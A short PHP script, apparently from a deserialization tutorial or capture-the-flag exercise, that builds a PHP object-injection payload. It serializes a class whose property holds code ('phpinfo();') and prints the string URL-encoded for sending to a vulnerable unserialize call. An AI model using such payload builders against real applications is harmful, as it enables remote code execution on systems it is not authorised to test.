<?php  
class CmdClass
{
   public $hook = "phpinfo();";
}

echo "<br>serialize output:<br>";
$data = serialize(new CmdClass);
print $data;

echo "<br>urlencode output:<br>";
print urlencode($data);
?> 
